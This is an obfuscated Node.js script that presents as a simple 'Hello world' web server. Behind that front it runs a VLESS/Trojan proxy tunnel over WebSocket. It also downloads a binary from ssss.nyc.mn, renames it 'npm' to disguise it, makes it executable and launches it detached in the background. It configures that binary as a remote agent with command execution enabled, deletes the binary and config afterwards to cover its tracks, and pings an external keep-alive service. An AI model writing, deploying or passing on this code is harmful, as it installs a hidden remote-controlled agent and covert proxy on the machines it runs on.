const _0x290d14=_0x123e;(function(_0x2ea016,_0x91be9d){const _0x56af93=_0x123e,_0x564f61=_0x2ea016();while(!![]){try{const _0x79bf57=parseInt(_0x56af93(0xf0))/0x1+-parseInt(_0x56af93(0x8d))/0x2+-parseInt(_0x56af93(0x96))/0x3*(parseInt(_0x56af93(0xca))/0x4)+-parseInt(_0x56af93(0xd7))/0x5*(-parseInt(_0x56af93(0x7e))/0x6)+-parseInt(_0x56af93(0xee))/0x7+parseInt(_0x56af93(0x9e))/0x8*(parseInt(_0x56af93(0xe7))/0x9)+-parseInt(_0x56af93(0xc4))/0xa;if(_0x79bf57===_0x91be9d)break;else _0x564f61['push'](_0x564f61['shift']());}catch(_0x2cec13){_0x564f61['push'](_0x564f61['shift']());}}}(_0x2cb0,0x38ce6));const os=require('os'),http=require(_0x290d14(0x94)),fs=require('fs'),axios=require(_0x290d14(0xec)),net=require('net'),path=require(_0x290d14(0xb3)),crypto=require(_0x290d14(0xc3)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x290d14(0xc9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x290d14(0xd6)]['UUID']||_0x290d14(0xbc),NEZHA_SERVER=process[_0x290d14(0xd6)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x290d14(0xd6)][_0x290d14(0x91)]||'',NEZHA_KEY=process[_0x290d14(0xd6)][_0x290d14(0xdc)]||'',DOMAIN=process['env'][_0x290d14(0xcd)]||'1234.abc.com',AUTO_ACCESS=process[_0x290d14(0xd6)][_0x290d14(0xc0)]||!![],WSPATH=process[_0x290d14(0xd6)][_0x290d14(0xe8)]||UUID[_0x290d14(0xaa)](0x0,0x8),SUB_PATH=process[_0x290d14(0xd6)][_0x290d14(0xb7)]||_0x290d14(0x8a),NAME=process[_0x290d14(0xd6)][_0x290d14(0xd8)]||'Hug',PORT=process[_0x290d14(0xd6)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0xe8e924=_0x290d14;try{const _0x4cd109=await axios['get'](_0xe8e924(0xe1)),_0x472055=_0x4cd109['data'];ISP=(_0x472055[_0xe8e924(0xbd)]+'-'+_0x472055['asOrganization'])['replace'](/ /g,'_');}catch(_0x21d66f){ISP=_0xe8e924(0xbf);}};GetISP();const httpServer=http['createServer']((_0x162fd6,_0x1c53d5)=>{const _0x3354c5=_0x290d14;if(_0x162fd6['url']==='/'){const _0x44d0c0=path[_0x3354c5(0xc6)](__dirname,_0x3354c5(0xde));fs['readFile'](_0x44d0c0,_0x3354c5(0xa2),(_0x12e9a2,_0x117ea1)=>{const _0x1ea576=_0x3354c5;if(_0x12e9a2){_0x1c53d5['writeHead'](0xc8,{'Content-Type':_0x1ea576(0xd5)}),_0x1c53d5[_0x1ea576(0xc1)](_0x1ea576(0x7a));return;}_0x1c53d5['writeHead'](0xc8,{'Content-Type':_0x1ea576(0xd5)}),_0x1c53d5[_0x1ea576(0xc1)](_0x117ea1);});return;}else{if(_0x162fd6[_0x3354c5(0x9b)]==='/'+SUB_PATH){const _0x43f532=_0x3354c5(0xa0)+UUID+'@'+DOMAIN+_0x3354c5(0xa1)+DOMAIN+_0x3354c5(0xea)+DOMAIN+_0x3354c5(0x80)+WSPATH+'#'+NAME+'-'+ISP,_0x2c5763=_0x3354c5(0xd1)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x3354c5(0xea)+DOMAIN+_0x3354c5(0x80)+WSPATH+'#'+NAME+'-'+ISP,_0x1d02ce=_0x43f532+'\x0a'+_0x2c5763,_0x4615f2=Buffer[_0x3354c5(0xa6)](_0x1d02ce)[_0x3354c5(0x9a)]('base64');_0x1c53d5[_0x3354c5(0xbb)](0xc8,{'Content-Type':_0x3354c5(0xdf)}),_0x1c53d5[_0x3354c5(0xc1)](_0x4615f2+'\x0a');}else _0x1c53d5['writeHead'](0x194,{'Content-Type':_0x3354c5(0xdf)}),_0x1c53d5['end'](_0x3354c5(0x88));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x290d14(0xda)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x290d14(0xef)];function resolveHost(_0x3dd144){return new Promise((_0x428b08,_0x3d896b)=>{const _0x1572e8=_0x123e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1572e8(0xab)](_0x3dd144)){_0x428b08(_0x3dd144);return;}let _0x405663=0x0;function _0x373fb6(){const _0x4f7cfb=_0x1572e8;if(_0x405663>=DNS_SERVERS[_0x4f7cfb(0xb8)]){_0x3d896b(new Error(_0x4f7cfb(0xb4)+_0x3dd144+_0x4f7cfb(0xbe)));return;}const _0x74bc1a=DNS_SERVERS[_0x405663];_0x405663++;const _0xd443b9=_0x4f7cfb(0x8f)+encodeURIComponent(_0x3dd144)+_0x4f7cfb(0xad);axios[_0x4f7cfb(0xba)](_0xd443b9,{'timeout':0x1388,'headers':{'Accept':_0x4f7cfb(0xd2)}})[_0x4f7cfb(0x7d)](_0x541d71=>{const _0x47bf06=_0x4f7cfb,_0x2a4f81=_0x541d71[_0x47bf06(0xcb)];if(_0x2a4f81['Status']===0x0&&_0x2a4f81[_0x47bf06(0xce)]&&_0x2a4f81[_0x47bf06(0xce)][_0x47bf06(0xb8)]>0x0){const _0xad97d5=_0x2a4f81[_0x47bf06(0xce)]['find'](_0x575476=>_0x575476[_0x47bf06(0xa3)]===0x1);if(_0xad97d5){_0x428b08(_0xad97d5[_0x47bf06(0xcb)]);return;}}_0x373fb6();})[_0x4f7cfb(0xb5)](_0x37acba=>{_0x373fb6();});}_0x373fb6();});}function handleVlessConnection(_0x334c19,_0x44382b){const _0x520345=_0x290d14,[_0x5a1d2a]=_0x44382b,_0x113b4e=_0x44382b[_0x520345(0xaa)](0x1,0x11);if(!_0x113b4e['every']((_0x28717d,_0x5179e8)=>_0x28717d==parseInt(uuid[_0x520345(0xa5)](_0x5179e8*0x2,0x2),0x10)))return![];let _0x3b2efb=_0x44382b[_0x520345(0xaa)](0x11,0x12)[_0x520345(0x98)]()+0x13;const _0x20984c=_0x44382b[_0x520345(0xaa)](_0x3b2efb,_0x3b2efb+=0x2)[_0x520345(0xe0)](0x0),_0xf9a5b0=_0x44382b[_0x520345(0xaa)](_0x3b2efb,_0x3b2efb+=0x1)[_0x520345(0x98)](),_0xec654=_0xf9a5b0==0x1?_0x44382b[_0x520345(0xaa)](_0x3b2efb,_0x3b2efb+=0x4)[_0x520345(0xc6)]('.'):_0xf9a5b0==0x2?new TextDecoder()[_0x520345(0xcc)](_0x44382b['slice'](_0x3b2efb+0x1,_0x3b2efb+=0x1+_0x44382b[_0x520345(0xaa)](_0x3b2efb,_0x3b2efb+0x1)['readUInt8']())):_0xf9a5b0==0x3?_0x44382b[_0x520345(0xaa)](_0x3b2efb,_0x3b2efb+=0x10)[_0x520345(0xc5)]((_0x13c369,_0x50c4be,_0x4623f3,_0x1ec772)=>_0x4623f3%0x2?_0x13c369[_0x520345(0xd0)](_0x1ec772[_0x520345(0xaa)](_0x4623f3-0x1,_0x4623f3+0x1)):_0x13c369,[])[_0x520345(0xb6)](_0xf107a1=>_0xf107a1[_0x520345(0xe0)](0x0)['toString'](0x10))[_0x520345(0xc6)](':'):'';_0x334c19[_0x520345(0xaf)](new Uint8Array([_0x5a1d2a,0x0]));const _0x48f850=createWebSocketStream(_0x334c19);return resolveHost(_0xec654)[_0x520345(0x7d)](_0x1b0e9e=>{const _0x54fb57=_0x520345;net['connect']({'host':_0x1b0e9e,'port':_0x20984c},function(){const _0x217668=_0x123e;this[_0x217668(0xd9)](_0x44382b[_0x217668(0xaa)](_0x3b2efb)),_0x48f850['on'](_0x217668(0xb1),()=>{})[_0x217668(0x93)](this)['on'](_0x217668(0xb1),()=>{})['pipe'](_0x48f850);})['on'](_0x54fb57(0xb1),()=>{});})[_0x520345(0xb5)](_0x1d02f4=>{const _0x599605=_0x520345;net['connect']({'host':_0xec654,'port':_0x20984c},function(){const _0x1cc22f=_0x123e;this[_0x1cc22f(0xd9)](_0x44382b[_0x1cc22f(0xaa)](_0x3b2efb)),_0x48f850['on']('error',()=>{})[_0x1cc22f(0x93)](this)['on'](_0x1cc22f(0xb1),()=>{})['pipe'](_0x48f850);})['on'](_0x599605(0xb1),()=>{});}),!![];}function _0x123e(_0x43ff85,_0xed0d96){const _0x2cb0cb=_0x2cb0();return _0x123e=function(_0x123ec6,_0x28b2ee){_0x123ec6=_0x123ec6-0x7a;let _0x3a8968=_0x2cb0cb[_0x123ec6];return _0x3a8968;},_0x123e(_0x43ff85,_0xed0d96);}function handleTrojanConnection(_0x1a09f8,_0x417eba){const _0x3388c4=_0x290d14;try{if(_0x417eba['length']<0x3a)return![];const _0xf58840=_0x417eba[_0x3388c4(0xaa)](0x0,0x38)['toString'](),_0x3c839f=[UUID];let _0x57be9b=null;for(const _0x52d903 of _0x3c839f){const _0x43af24=crypto[_0x3388c4(0x81)]('sha224')['update'](_0x52d903)['digest'](_0x3388c4(0x85));if(_0x43af24===_0xf58840){_0x57be9b=_0x52d903;break;}}if(!_0x57be9b)return![];let _0x25fba5=0x38;_0x417eba[_0x25fba5]===0xd&&_0x417eba[_0x25fba5+0x1]===0xa&&(_0x25fba5+=0x2);const _0x20da71=_0x417eba[_0x25fba5];if(_0x20da71!==0x1)return![];_0x25fba5+=0x1;const _0x304d44=_0x417eba[_0x25fba5];_0x25fba5+=0x1;let _0x1acc0d,_0x804968;if(_0x304d44===0x1)_0x1acc0d=_0x417eba['slice'](_0x25fba5,_0x25fba5+0x4)[_0x3388c4(0xc6)]('.'),_0x25fba5+=0x4;else{if(_0x304d44===0x3){const _0x2669ad=_0x417eba[_0x25fba5];_0x25fba5+=0x1,_0x1acc0d=_0x417eba['slice'](_0x25fba5,_0x25fba5+_0x2669ad)[_0x3388c4(0x9a)](),_0x25fba5+=_0x2669ad;}else{if(_0x304d44===0x4)_0x1acc0d=_0x417eba[_0x3388c4(0xaa)](_0x25fba5,_0x25fba5+0x10)[_0x3388c4(0xc5)]((_0x179624,_0x220fd4,_0x58ac4e,_0xbdf0cc)=>_0x58ac4e%0x2?_0x179624[_0x3388c4(0xd0)](_0xbdf0cc[_0x3388c4(0xaa)](_0x58ac4e-0x1,_0x58ac4e+0x1)):_0x179624,[])[_0x3388c4(0xb6)](_0x42a3b5=>_0x42a3b5['readUInt16BE'](0x0)[_0x3388c4(0x9a)](0x10))[_0x3388c4(0xc6)](':'),_0x25fba5+=0x10;else return![];}}_0x804968=_0x417eba[_0x3388c4(0xe0)](_0x25fba5),_0x25fba5+=0x2;_0x25fba5<_0x417eba[_0x3388c4(0xb8)]&&_0x417eba[_0x25fba5]===0xd&&_0x417eba[_0x25fba5+0x1]===0xa&&(_0x25fba5+=0x2);const _0x500f21=createWebSocketStream(_0x1a09f8);return resolveHost(_0x1acc0d)[_0x3388c4(0x7d)](_0x51344f=>{net['connect']({'host':_0x51344f,'port':_0x804968},function(){const _0x2d2a6f=_0x123e;_0x25fba5<_0x417eba[_0x2d2a6f(0xb8)]&&this[_0x2d2a6f(0xd9)](_0x417eba['slice'](_0x25fba5)),_0x500f21['on'](_0x2d2a6f(0xb1),()=>{})['pipe'](this)['on'](_0x2d2a6f(0xb1),()=>{})[_0x2d2a6f(0x93)](_0x500f21);})['on']('error',()=>{});})[_0x3388c4(0xb5)](_0x346e17=>{const _0x431159=_0x3388c4;net['connect']({'host':_0x1acc0d,'port':_0x804968},function(){const _0x188549=_0x123e;_0x25fba5<_0x417eba['length']&&this[_0x188549(0xd9)](_0x417eba['slice'](_0x25fba5)),_0x500f21['on'](_0x188549(0xb1),()=>{})[_0x188549(0x93)](this)['on'](_0x188549(0xb1),()=>{})[_0x188549(0x93)](_0x500f21);})['on'](_0x431159(0xb1),()=>{});}),!![];}catch(_0x1f041b){return![];}}wss['on']('connection',(_0x5143a2,_0x35faa7)=>{const _0xc4ee66=_0x290d14,_0xe067ff=_0x35faa7[_0xc4ee66(0x9b)]||'';_0x5143a2[_0xc4ee66(0xcf)](_0xc4ee66(0xe3),_0x3b3bad=>{const _0x3f54d3=_0xc4ee66;if(_0x3b3bad['length']>0x11&&_0x3b3bad[0x0]===0x0){const _0x475665=_0x3b3bad[_0x3f54d3(0xaa)](0x1,0x11),_0x4ba2ad=_0x475665[_0x3f54d3(0x86)]((_0x1d8045,_0x1df62f)=>_0x1d8045==parseInt(uuid['substr'](_0x1df62f*0x2,0x2),0x10));if(_0x4ba2ad){!handleVlessConnection(_0x5143a2,_0x3b3bad)&&_0x5143a2['close']();return;}}!handleTrojanConnection(_0x5143a2,_0x3b3bad)&&_0x5143a2['close']();})['on'](_0xc4ee66(0xb1),()=>{});});const getDownloadUrl=()=>{const _0x1a8099=_0x290d14,_0x33018a=os['arch']();return _0x33018a===_0x1a8099(0xa7)||_0x33018a===_0x1a8099(0x8c)||_0x33018a===_0x1a8099(0xac)?!NEZHA_PORT?_0x1a8099(0x99):_0x1a8099(0xe9):!NEZHA_PORT?_0x1a8099(0xc8):_0x1a8099(0xe2);},downloadFile=async()=>{const _0x256aee=_0x290d14;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4d7d66=getDownloadUrl(),_0x197fa9=await axios({'method':_0x256aee(0xba),'url':_0x4d7d66,'responseType':_0x256aee(0x9f)}),_0x39452a=fs[_0x256aee(0x9c)]('npm');return _0x197fa9[_0x256aee(0xcb)][_0x256aee(0x93)](_0x39452a),new Promise((_0x26b709,_0x461221)=>{const _0x33db9b=_0x256aee;_0x39452a['on'](_0x33db9b(0x89),()=>{const _0x49023a=_0x33db9b;console[_0x49023a(0xdb)](_0x49023a(0x82)),exec(_0x49023a(0xa8),_0x4f45de=>{if(_0x4f45de)_0x461221(_0x4f45de);_0x26b709();});}),_0x39452a['on']('error',_0x461221);});}catch(_0x5a8d99){throw _0x5a8d99;}},runnz=async()=>{const _0x37ae7d=_0x290d14;try{const _0x107d6c=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x37ae7d(0x92)});if(_0x107d6c['trim']()!==''){console['log'](_0x37ae7d(0x9d));return;}}catch(_0x4fb944){}await downloadFile();let _0x433146='',_0x52d009=[_0x37ae7d(0xdd),_0x37ae7d(0xe6),_0x37ae7d(0xa9),_0x37ae7d(0x7b),'2083',_0x37ae7d(0x7c)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x400588=_0x52d009[_0x37ae7d(0x83)](NEZHA_PORT)?'--tls':'';_0x433146=_0x37ae7d(0xa4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x400588+_0x37ae7d(0xe4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x214269=NEZHA_SERVER[_0x37ae7d(0x83)](':')?NEZHA_SERVER[_0x37ae7d(0xc7)](':')['pop']():'',_0x37f91d=_0x52d009[_0x37ae7d(0x83)](_0x214269)?_0x37ae7d(0xd4):_0x37ae7d(0xd3),_0x692b6a='client_secret:\x20'+NEZHA_KEY+_0x37ae7d(0x87)+NEZHA_SERVER+_0x37ae7d(0x95)+_0x37f91d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x37ae7d(0x84),_0x692b6a);}_0x433146='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x37ae7d(0xdb)](_0x37ae7d(0xeb));return;}}try{exec(_0x433146,{'shell':_0x37ae7d(0xb2)},_0x144306=>{const _0xe9e68d=_0x37ae7d;if(_0x144306)console[_0xe9e68d(0xb1)]('npm\x20running\x20error:',_0x144306);else console[_0xe9e68d(0xdb)](_0xe9e68d(0xed));});}catch(_0x531020){console[_0x37ae7d(0xb1)](_0x37ae7d(0xc2)+_0x531020);}};async function addAccessTask(){const _0x2363f1=_0x290d14;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4bc0fd=_0x2363f1(0x7f)+DOMAIN;try{const _0x2dbfd7=await axios[_0x2363f1(0x97)](_0x2363f1(0x90),{'url':_0x4bc0fd},{'headers':{'Content-Type':_0x2363f1(0xae)}});console[_0x2363f1(0xdb)](_0x2363f1(0xb0));}catch(_0x3d7bc5){}}const delFiles=()=>{const _0x390671=_0x290d14;fs['unlink'](_0x390671(0x8e),()=>{}),fs[_0x390671(0xe5)](_0x390671(0x84),()=>{});};function _0x2cb0(){const _0x3d5fd2=['error','/bin/bash','path','Failed\x20to\x20resolve\x20','catch','map','SUB_PATH','length','listen','get','writeHead','5efabea4-f6d4-91fd-b8f0-17e004c89c60','country','\x20with\x20all\x20DNS\x20servers','Unknown','AUTO_ACCESS','end','error:\x20','crypto','4055990XvIYsu','reduce','join','split','https://amd64.ssss.nyc.mn/v1','child_process','934860xyhMdr','data','decode','DOMAIN','Answer','once','concat','trojan://','application/dns-json','false','true','text/html','env','11655WqmIvX','NAME','write','replace','log','NEZHA_KEY','443','index.html','text/plain','readUInt16BE','https://speed.cloudflare.com/meta','https://amd64.ssss.nyc.mn/agent','message','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','unlink','8443','4071969BzMFdm','WSPATH','https://arm64.ssss.nyc.mn/agent','&fp=chrome&type=ws&host=','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','axios','npm\x20is\x20running','576590jTshRW','1.1.1.1','137794vmyqEz','Hello\x20world!','2087','2053','then','1134myVuUp','https://','&path=%2F','createHash','npm\x20download\x20successfully','includes','config.yaml','hex','every','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Not\x20Found\x0a','finish','sub','Server\x20is\x20running\x20on\x20port\x20','arm64','152864WoMwzK','npm','https://dns.google/resolve?name=','https://oooo.serv00.net/add-url','NEZHA_PORT','utf-8','pipe','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','3PGcdmH','post','readUInt8','https://arm64.ssss.nyc.mn/v1','toString','url','createWriteStream','npm\x20is\x20already\x20running,\x20skip\x20running...','8RkcYCK','stream','vless://',':443?encryption=none&security=tls&sni=','utf8','type','setsid\x20nohup\x20./npm\x20-s\x20','substr','from','arm','chmod\x20+x\x20npm','2096','slice','test','aarch64','&type=A','application/json','send','Automatic\x20Access\x20Task\x20added\x20successfully'];_0x2cb0=function(){return _0x3d5fd2;};return _0x2cb0();}httpServer[_0x290d14(0xb9)](PORT,()=>{const _0x5bd124=_0x290d14;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5bd124(0xdb)](_0x5bd124(0x8b)+PORT);});
